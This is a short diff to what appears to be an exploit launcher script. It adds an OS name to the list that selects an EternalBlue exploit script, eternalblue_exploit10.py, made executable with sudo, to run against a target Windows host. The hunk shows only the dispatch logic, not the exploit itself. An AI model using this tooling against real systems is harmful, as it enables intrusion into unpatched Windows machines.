@@ -76,7 +76,7 @@ def execVuln(target):
 	shellcode = ""
 	clearAndTitle()
 	
-	if os in ["Microsoft Windows 2012", "Microsoft Windows 2016", "Microsoft Windows 10", "Microsoft Windows 8", "Microsoft Windows 8.1"]:
+	if os in ["Microsoft Windows 2012", "Microsoft Windows 2012|7|8.1", "Microsoft Windows 2016", "Microsoft Windows 10", "Microsoft Windows 8", "Microsoft Windows 8.1"]:
 		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit10.py"])
 		script = "eternalblue_exploit10.py"
 	elif os in ["Microsoft Windows 7", "Microsoft Windows 2008"]:
